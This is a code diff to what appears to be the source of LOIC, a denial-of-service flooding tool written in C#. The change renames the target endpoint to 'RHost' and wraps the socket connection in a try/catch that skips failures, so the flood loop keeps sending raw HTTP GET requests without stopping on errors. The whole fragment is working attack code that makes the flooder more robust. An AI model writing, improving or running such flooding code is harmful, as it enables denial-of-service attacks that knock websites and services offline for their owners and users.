@@ -76,7 +76,7 @@ namespace LOIC
                 {
                     buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.1{1}Host: {2}{1}{1}{1}", Subsite, Environment.NewLine, Host));
                 }
-				var target = new IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
+				var RHost = new IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
 				while (IsFlooding)
 				{
 					State = ReqState.Ready; // SET STATE TO READY //
@@ -84,7 +84,10 @@ namespace LOIC
 					byte[] recvBuf = new byte[64];
 					var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 					State = ReqState.Connecting; // SET STATE TO CONNECTING //
-					socket.Connect(target);
+					
+					try { socket.Connect(RHost); }
+					catch { continue; }
+					
 					socket.Blocking = Resp;
 					State = ReqState.Requesting; // SET STATE TO REQUESTING //
 					socket.Send(buf, SocketFlags.None);
